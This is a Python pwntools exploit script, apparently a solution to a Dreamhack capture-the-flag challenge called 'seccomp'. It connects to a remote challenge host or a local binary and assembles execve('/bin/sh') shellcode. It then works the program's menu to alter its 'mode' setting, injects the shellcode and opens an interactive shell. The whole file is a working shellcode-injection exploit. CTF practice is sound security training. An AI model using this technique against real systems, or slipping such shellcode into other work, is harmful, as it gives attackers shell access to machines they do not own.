#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./seccomp")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 19326)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def assemble(shellcode: list[str], debug=False) -> bytes:
    sc = ""
    if debug:
        for i in range(len(shellcode)):
            entry = shellcode[i]
            print(f"{i}: {pwn.asm(entry).hex()}")

    for entry in shellcode:
        sc += f"{entry};"
    return pwn.asm(sc)


def main():
    io = connect()

    shellcode = [
        "lea rdi, [rip+path]",
        "mov rsi, 0",
        "mov rdx, 0",
        "mov rax, 59",
        "syscall",
        'path: .asciz "/bin/sh"',
    ]

    shellcode_assembled = assemble(shellcode, debug=False)

    with open("./payload", "wb") as file:
        file.write(shellcode_assembled)

    mode = unwrap(exe.symbol("mode"))

    io.sendline(b"3")
    io.sendline(str(mode).encode())
    io.sendline(str(2).encode())
    io.sendline(b"1")
    io.sendline(shellcode_assembled)
    io.sendline(b"2")
    io.interactive()

    return


if __name__ == "__main__":
    main()
